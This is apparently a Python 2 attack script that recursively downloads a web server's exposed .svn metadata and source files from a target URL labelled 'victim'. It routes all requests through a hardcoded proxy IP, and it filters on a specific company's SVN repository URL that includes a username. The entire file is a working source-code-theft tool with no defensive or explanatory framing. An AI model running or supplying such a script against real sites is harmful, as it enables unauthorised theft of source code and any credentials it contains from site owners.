import os
import requests
import sys
proxies = {'http' : 'http://103.28.38.238:20648'}
victim = sys.argv[1]

def getct(url):
	r = requests.get(url, proxies=proxies)
	return r.content
def checkentries(filee):
  with open(filee, 'r') as file:
    for line in file:
      if 'https://phatnk2@fproject.fpt.vn/svn/fptplay-tv' in line.split(): #edit yourselves
        return True
    else:
      return False
      
def getsvn(dir="/"):
	r = getct(victim + dir + '/.svn/entries')
	if not os.path.exists('code/' + dir):
		os.makedirs('code/' + dir)
	f = open('code/'+dir+'/entries', 'w')
	f.write(r)
	f.close()
	data = [line.strip() for line in open('code/'+dir+'/entries', 'r')]
	
	for i in range(len(data)):
		if checkentries('code/'+dir+'/entries')==True:
			if 'dir' in data[i]:
				if (data[i-1] != ''):
					print 'Fetching dir '+dir+'/'+data[i-1]+' ...'
					getsvn(dir + '/'+data[i-1]+'/')
			if 'file' in data[i]:
				if (data[i-1] != '') and data[i-1].find('.mp4')==-1:
					print 'Downloading file '+dir+'/'+data[i-1]+' ...'
					fg = getct(victim + dir + '/.svn/text-base/'+ data[i-1] + '.svn-base')
					f = open('code/' + dir + '/' + data[i-1], 'w')
					f.write(fg)
					f.close()

g = getsvn()
print g
